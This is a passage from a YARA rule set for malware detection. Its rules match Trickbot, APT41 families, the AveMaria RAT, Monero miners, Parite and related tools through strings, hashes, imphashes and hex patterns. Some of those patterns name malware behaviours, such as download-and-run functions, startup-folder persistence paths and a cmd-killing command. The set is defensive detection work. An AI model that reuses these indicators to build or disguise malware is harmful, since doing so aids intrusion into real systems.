them\n}\n\nrule MAL_Trickbot_Malware_Oct19_5_RID3137 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:13:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"58852140a2dc30e799b7d50519c56e2fd3bb506691918dbf5d4244cc1f4558a2\"\n      hash2 = \"aabf54eb27de3d72078bbe8d99a92f5bcc1e43ff86774eb5321ed25fba5d27d4\"\n      hash3 = \"9ecc794ec77ce937e8c835d837ca7f0548ef695090543ed83a7adbc07da9f536\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"LoadShellCode\" fullword ascii\n      $s2 = \"pShellCode\" fullword ascii\n      $s3 = \"InitShellCode\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 2 of them\n}\n\nrule MAL_Trickbot_Malware_Oct19_6_RID3138 : DEMO EXE FILE MAL T1547_001 {\n   meta:\n      description = \"Detects Trickbot malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-10-02 13:13:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cf99990bee6c378cbf56239b3cc88276eec348d82740f84e9d5c343751f82560\"\n      tags = \"DEMO, EXE, FILE, MAL, T1547_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"D:\\\\MyProjects\\\\spreader\\\\Release\\\\ssExecutor_x86.pdb\" fullword ascii\n      $s1 = \"%s\\\\appdata\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\%s\" fullword ascii\n      $s2 = \"%s\\\\appdata\\\\roaming\\\\%s\" fullword ascii\n      $s3 = \"WINDOWS\\\\SYSTEM32\\\\TASKS\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize <= 400KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule SUSP_Unsigned_OSPPSVC_RID2E85 : DEMO EXE FILE OFFICE SUSP T1569_002 {\n   meta:\n      description = \"Detects a suspicious unsigned office software protection platform service binary\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2019/09/24/no-summer-vacations-zebrocy/\"\n      date = \"2019-09-26 11:18:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5294a730f1f0a176583b9ca2b988b3f5ec65dad8c6ebe556b5135566f2c16a56\"\n      tags = \"DEMO, EXE, FILE, OFFICE, SUSP, T1569_002\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $sc1 = { 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63\n               00 72 00 69 00 70 00 74 00 69 00 6F 00 6E 00 00\n               00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F\n               00 66 00 74 00 20 00 4F 00 66 00 66 00 69 00 63\n               00 65 00 20 00 53 00 6F 00 66 00 74 00 77 00 61\n               00 72 00 65 00 20 00 50 00 72 00 6F 00 74 00 65\n               00 63 00 74 00 69 00 6F 00 6E 00 20 00 50 00 6C\n               00 61 00 74 00 66 00 6F 00 72 00 6D 00 20 00 53\n               00 65 00 72 00 76 00 69 00 63 00 65 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and $sc1 and pe.number_of_signatures < 1\n}\n\nrule MAL_ArtraDownloader2_Aug19_1_RID30FB : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects ArtraDownloader malware\"\n      author = \"Florian Roth\"\n      reference = \"https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/\"\n      date = \"2019-08-27 13:03:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f0ef4242cc6b8fa3728b61d2ce86ea934bd59f550de9167afbca0b0aaa3b2c22\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 47 45 54 20 25 73 20 48 54 54 50 2F 31 2E 30 00\n               0D 0A 00 00 48 6F 73 74 3A 20 25 73 00 00 00 00\n               3F 61 3D 00 26 62 3D 00 26 63 3D 00 26 64 3D 00\n               26 65 3D 00 25 32 30 } \n      $xc2 = { 25 73 20 25 73 20 25 73 0D 0A 25 73 20 25 73 0D\n               0A 25 73 25 73 0D 0A 25 73 25 73 0D 0A 25 73 20\n               25 64 0D 0A 0D 0A 25 73 00 00 00 00 71 72 79 3D } \n      $xc3 = { 49 44 3D 25 73 00 00 00 3A 00 00 00 25 73 20 25\n               73 20 25 73 0D 0A 25 73 20 25 73 0D 0A 25 73 25\n               73 0D 0A 25 73 25 73 0D 0A 43 6F 6E 74 65 6E 74\n               2D 6C 65 6E 67 74 68 25 73 20 25 64 } \n      $xc4 = { 25 73 20 25 73 20 25 73 0D 0A 25 73 20 25 73 0D\n               0A 25 73 25 73 0D 0A 25 73 25 73 0D 0A 43 6F 6E\n               74 65 6E 74 2D 6C 65 6E 67 74 68 3A 20 25 64 0D\n               0A 0D 0A 25 73 } \n      $x1 = \"Tpguxbsf]Njdsptpgu\" ascii\n      $x2 = \".gpsn.vsmfodpefe\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them\n}\n\nrule APT_APT41_POISONPLUG_3_RID2DA0 : APT DEMO EXE FILE G0096 T1218_011 {\n   meta:\n      description = \"Detects APT41 malware POISONPLUG\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 10:39:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"70c03ce5c80aca2d35a5555b0532eedede24d4cc6bdb32a2c8f7e630bba5f26e\"\n      tags = \"APT, DEMO, EXE, FILE, G0096, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Rundll32.exe \\\"%s\\\", DisPlay 64\" fullword ascii\n      $s2 = \"tcpview.exe\" fullword ascii\n      $s3 = \"nuR\\\\noisreVtnerruC\\\\swodniW\\\\tfosorciM\\\\erawtfoS\" fullword ascii\n      $s4 = \"AxEeulaVteSgeR\" fullword ascii\n      $s5 = \"%04d-%02d-%02d_%02d-%02d-%02d.dmp\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 3 of them\n}\n\nrule APT_APT41_POISONPLUG_SHADOW_RID2F33 : APT DEMO EXE FILE G0096 {\n   meta:\n      description = \"Detects APT41 malware POISONPLUG SHADOW\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 11:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"462a02a8094e833fd456baf0a6d4e18bb7dab1a9f74d5f163a8334921a4ffde8\"\n      tags = \"APT, DEMO, EXE, FILE, G0096\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and pe.imphash ( ) == \"c67de089f2009b21715744762fc484e8\"\n}\n\nrule APT_APT41_CRACKSHOT_RID2CA0 : APT DEMO EXE FILE G0096 {\n   meta:\n      description = \"Detects APT41 malware CRACKSHOT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 09:57:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"993d14d00b1463519fea78ca65d8529663f487cd76b67b3fd35440bcdf7a8e31\"\n      tags = \"APT, DEMO, EXE, FILE, G0096\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \";procmon64.exe;netmon.exe;tcpview.exe;MiniSniffer.exe;smsniff.exe\" ascii\n      $s1 = \"RunUrlBinInMem\" fullword ascii\n      $s2 = \"DownRunUrlFile\" fullword ascii\n      $s3 = \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\" fullword ascii\n      $s4 = \"%s|%s|%s|%s|%s|%s|%s|%dx%d|%04x|%08X|%s|%s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule APT_APT41_POISONPLUG_2_RID2D9F : APT DEMO EXE FILE G0096 {\n   meta:\n      description = \"Detects APT41 malware POISONPLUG\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 10:39:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0055dfaccc952c99b1171ce431a02abfce5c6f8fb5dc39e4019b624a7d03bfcb\"\n      tags = \"APT, DEMO, EXE, FILE, G0096\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ma_lockdown_service.dll\" fullword wide\n      $s2 = \"acbde.dll\" fullword ascii\n      $s3 = \"MA lockdown Service\" fullword wide\n      $s4 = \"McAfee Agent\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 11000KB and all of them\n}\n\nrule APT_APT41_POISONPLUG_RID2D0E : APT DEMO EXE FILE G0096 {\n   meta:\n      description = \"Detects APT41 malware POISONPLUG\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 10:15:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2eea29d83f485897e2bac9501ef000cc266ffe10019d8c529555a3435ac4aabd\"\n      hash2 = \"5d971ed3947597fbb7e51d806647b37d64d9fe915b35c7c9eaf79a37b82dab90\"\n      hash3 = \"f4d57acde4bc546a10cd199c70cdad09f576fdfe66a36b08a00c19ff6ae19661\"\n      tags = \"APT, DEMO, EXE, FILE, G0096\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"TSMSISrv.DLL\" fullword wide\n      $s2 = \"[-]write failed[%d]\" fullword ascii\n      $s3 = \"[-]load failed\" fullword ascii\n      $s4 = \"Remote Desktop Services\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and ( pe.imphash ( ) == \"1b074ef7a1c0888ef31337c8ad2f2e0a\" or 2 of them )\n}\n\nrule APT_APT41_HIGHNOON_RID2C58 : APT DEMO EXE FILE G0096 {\n   meta:\n      description = \"Detects APT41 malware HIGHNOON\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 09:45:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"63e8ed9692810d562adb80f27bb1aeaf48849e468bf5fd157bc83ca83139b6d7\"\n      hash2 = \"4aa6970cac04ace4a930de67d4c18106cf4004ba66670cfcdaa77a4c4821a213\"\n      tags = \"APT, DEMO, EXE, FILE, G0096\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"workdll64.dll\" fullword ascii\n      $s1 = \"\\\\Fonts\\\\Error.log\" ascii\n      $s2 = \"[%d/%d/%d/%d:%d:%d]\" fullword ascii\n      $s3 = \"work_end\" fullword ascii\n      $s4 = \"work_start\" fullword ascii\n      $s5 = \"\\\\svchost.exe\" ascii\n      $s6 = \"LoadAppInit_DLLs\" fullword ascii\n      $s7 = \"netsvcs\" fullword ascii\n      $s8 = \"HookAPIs ...PID %d \" fullword ascii\n      $s9 = \"SOFTWARE\\\\Microsoft\\\\HTMLHelp\" fullword ascii\n      $s0 = \"DllMain_mem\" fullword ascii\n      $s10 = \"%s\\\\NtKlRes.dat\" fullword ascii\n      $s11 = \"Global\\\\%s-%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule APT_APT41_HIGHNOON_2_RID2CE9 : APT DEMO EXE FILE G0096 {\n   meta:\n      description = \"Detects APT41 malware HIGHNOON\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 10:09:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"79190925bd1c3fae65b0d11db40ac8e61fb9326ccfed9b7e09084b891089602d\"\n      tags = \"APT, DEMO, EXE, FILE, G0096\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"H:\\\\RBDoor\\\\\" ascii\n      $s1 = \"PlusDll.dll\" fullword ascii\n      $s2 = \"ShutDownEvent.dll\" fullword ascii\n      $s3 = \"\\\\svchost.exe\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"b70358b00dd0138566ac940d0da26a03\" or pe.exports ( \"DllMain_mem\" ) or $x1 or 3 of them )\n}\n\nrule APT_APT41_HIGHNOON_BIN_RID2D90 : APT DEMO EXE FILE G0096 {\n   meta:\n      description = \"Detects APT41 malware HIGHNOON.BIN\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 10:37:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"490c3e4af829e85751a44d21b25de1781cfe4961afdef6bb5759d9451f530994\"\n      hash2 = \"79190925bd1c3fae65b0d11db40ac8e61fb9326ccfed9b7e09084b891089602d\"\n      tags = \"APT, DEMO, EXE, FILE, G0096\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"PlusDll.dll\" fullword ascii\n      $s2 = \"\\\\Device\\\\PORTLESS_DeviceName\" wide\n      $s3 = \"%s%s\\\\Security\" fullword ascii\n      $s4 = \"%s\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" fullword ascii\n      $s5 = \"%s%s\\\\Enum\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"b70358b00dd0138566ac940d0da26a03\" or 3 of them )\n}\n\nrule APT_APT41_HIGHNOON_BIN_2_RID2E21 : APT DEMO EXE FILE G0096 {\n   meta:\n      description = \"Detects APT41 malware HIGHNOON.BIN\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html\"\n      date = \"2019-08-07 11:01:21\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"63e8ed9692810d562adb80f27bb1aeaf48849e468bf5fd157bc83ca83139b6d7\"\n      hash2 = \"c51c5bbc6f59407286276ce07f0f7ea994e76216e0abe34cbf20f1b1cbd9446d\"\n      tags = \"APT, DEMO, EXE, FILE, G0096\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Double\\\\Door_wh\\\\\" ascii\n      $x2 = \"[Stone] Config --> 2k3 TCP Positive Logout.\" fullword ascii\n      $x3 = \"\\\\RbDoorX64.pdb\" ascii\n      $x4 = \"RbDoor, Version 1.0\" fullword wide\n      $x5 = \"About RbDoor\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}\n\nrule SUSP_Unsigned_GoogleUpdate_RID3117 : DEMO EXE FILE HIGHVOL SUSP {\n   meta:\n      description = \"Detects suspicious unsigned GoogleUpdate.exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-08-05 13:07:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5aa84aa5c90ec34b7f7d75eb350349ae3aa5060f3ad6dd0520e851626e9f8354\"\n      tags = \"DEMO, EXE, FILE, HIGHVOL, SUSP\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $ac1 = { 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C\n               00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65\n               00 00 00 47 00 6F 00 6F 00 67 00 6C 00 65 00 55\n               00 70 00 64 00 61 00 74 00 65 00 2E 00 65 00 78\n               00 65 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and $ac1 and pe.number_of_signatures < 1\n}\n\nrule SUSP_DOC_LNK_in_ZIP_RID2D5D : DEMO FILE SUSP T1547_009 {\n   meta:\n      description = \"Detects suspicious .doc.lnk file in ZIP archive\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/RedDrip7/status/1145877272945025029\"\n      date = \"2019-07-02 10:28:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7ea4f77cac557044e72a8e280372a2abe072f2ad98b5a4fbed4e2229e780173a\"\n      tags = \"DEMO, FILE, SUSP, T1547_009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".doc.lnk\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and 1 of them\n}\n\nrule MAL_AveMaria_RAT_Jul19_RID2E8A : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects AveMaria RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/abuse_ch/status/1145697917161934856\"\n      date = \"2019-07-01 11:18:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5a927db1566468f23803746ba0ccc9235c79ca8672b1444822631ddbf2651a59\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"operator co_await\" fullword ascii\n      $s1 = \"uohlyatqn\" fullword ascii\n      $s2 = \"index = [%d][%d][%d][%d]\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule SUSP_OfficeDoc_VBA_Base64Decode_RID31DD : DEMO FILE SCRIPT SUSP T1132_001 {\n   meta:\n      description = \"Detects suspicious VBA code with Base64 decode functions\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/cpaton/Scripting/blob/master/VBA/Base64.bas\"\n      date = \"2019-06-21 13:40:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"52262bb315fa55b7441a04966e176b0e26b7071376797e35c80aa60696b6d6fc\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP, T1132_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"B64_CHAR_DICT\" ascii\n      $s2 = \"Base64Decode\" ascii\n      $s3 = \"Base64Encode\" ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 60KB and 2 of them\n}\n\nrule SUSP_VBA_FileSystem_Access_RID30A9 : DEMO FILE SCRIPT SUSP {\n   meta:\n      description = \"Detects suspicious VBA that writes to disk and is activated on document open\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2019-06-21 12:49:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-01-15\"\n      hash1 = \"52262bb315fa55b7441a04966e176b0e26b7071376797e35c80aa60696b6d6fc\"\n      tags = \"DEMO, FILE, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Common Files\\\\Microsoft Shared\\\\\" wide\n      $s2 = \"Scripting.FileSystemObject\" ascii\n      $a1 = \"Document_Open\" ascii\n      $a2 = \"WScript.Shell\" ascii\n      $a3 = \"AutoOpen\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 100KB and all of ( $s* ) and 1 of ( $a* )\n}\n\nrule SUSP_XMRIG_Reference_RID2E30 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects an executable with a suspicious XMRIG crypto miner reference\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/itaitevet/status/1141677424045953024\"\n      date = \"2019-06-20 11:03:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\xmrig\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}\n\nrule MAL_XMR_Miner_May19_1_RID2E1B : DEMO EXE FILE HIGHVOL MAL {\n   meta:\n      description = \"Detects Monero Crypto Coin Miner\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 11:00:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d6df423efb576f167bc28b3c08d10c397007ba323a0de92d1e504a3f490752fc\"\n      tags = \"DEMO, EXE, FILE, HIGHVOL, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"donate.ssl.xmrig.com\" fullword ascii\n      $x2 = \"* COMMANDS     'h' hashrate, 'p' pause, 'r' resume\" fullword ascii\n      $s1 = \"[%s] login error code: %d\" fullword ascii\n      $s2 = \"\\\\\\\\?\\\\pipe\\\\uv\\\\%p-%lu\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 14000KB and ( pe.imphash ( ) == \"25d9618d1e16608cd5d14d8ad6e1f98e\" or 1 of ( $x* ) or 2 of them )\n}\n\nrule MAL_Ramnit_May19_1_RID2D35 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Ramnit malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 10:22:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d7ec3fcd80b3961e5bab97015c91c843803bb915c13a4a35dfb5e9bdf556c6d3\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and pe.imphash ( ) == \"500cd02578808f964519eb2c85153046\"\n}\n\nrule MAL_Parite_Malware_May19_1_RID3057 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Parite malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 12:35:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c9d8852745e81f3bfc09c0a3570d018ae8298af675e3c6ee81ba5b594ff6abb8\"\n      hash2 = \"8d47b08504dcf694928e12a6aa372e7fa65d0d6744429e808ff8e225aefa5af2\"\n      hash3 = \"285e3f21dd1721af2352196628bada81050e4829fb1bb3f8757a45c221737319\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"taskkill /im cmd.exe /f\" fullword ascii\n      $s2 = \"LOADERX64.dll\" fullword ascii\n      $x1 = \"\\\\dllhot.exe\" ascii\n      $x2 = \"dllhot.exe --auto --any --forever --keepalive\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule MAL_Parite_Malware_May19_2_RID3058 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Parite malware based on Imphash\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 12:35:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c9d8852745e81f3bfc09c0a3570d018ae8298af675e3c6ee81ba5b594ff6abb8\"\n      hash2 = \"8d47b08504dcf694928e12a6aa372e7fa65d0d6744429e808ff8e225aefa5af2\"\n      hash3 = \"285e3f21dd1721af2352196628bada81050e4829fb1bb3f8757a45c221737319\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 18000KB and ( pe.imphash ( ) == \"b132a2719be01a6ef87d9939d785e19e\" or pe.imphash ( ) == \"78f4f885323ffee9f8fa011455d0523d\" )\n}\n\nrule EXPL_Strings_CVE_POC_May19_1_RID3091 : DEMO EXE EXPLOIT FILE {\n   meta:\n      description = \"Detects strings used in CVE POC noticed in May 2019\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 12:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"01c3882e8141a25abe37bb826ab115c52fd3d109c4a1b898c0c78cee8dac94b4\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Debug\\\\poc_cve_20\" ascii\n      $x2 = \"\\\\Release\\\\poc_cve_20\" ascii\n      $x3 = \"alloc fake fail: %x!\" fullword ascii\n      $x4 = \"Allocate fake tagWnd fail!\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them\n}\n\nrule HKTL_CN_ProcHook_May19_1_RID2F38 : CHINA DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects hacktool used by Chinese threat groups\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 11:47:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"02ebdc1ff6075c15a44711ccd88be9d6d1b47607fea17bef7e5e17f8da35293e\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and pe.imphash ( ) == \"343d580dd50ee724746a5c28f752b709\"\n}\n\nrule SUSP_PDB_CN_Threat_Actor_May19_1_RID3220 : CHINA DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects PDB path user name used by Chinese threat actors\"\n      author = \"Florian Roth\"\n      reference = \"https://www.guardicore.com/2019/05/nansh0u-campaign-hackers-arsenal-grows-stronger/\"\n      date = \"2019-05-31 13:51:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"01c3882e8141a25abe37bb826ab115c52fd3d109c4a1b898c0c78cee8dac94b4\"\n      tags = \"CHINA, DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Users\\\\zcg\\\\Desktop\\\\\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them\n}\n\nrule HKTL_LNX_Pnscan_RID2C57 : DEMO HKTL LINUX T1046 {\n   meta:\n      description = \"Detects Pnscan port scanner\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/ptrrkssn/pnscan\"\n      date = \"2019-05-27 09:45:01\"\n      score = 55\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, LINUX, T1046\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-R<hex list>   Hex coded response string to look for.\" fullword ascii\n      $x2 = \"This program implements a multithreaded TCP port scanner.\" ascii wide\n   condition: \n      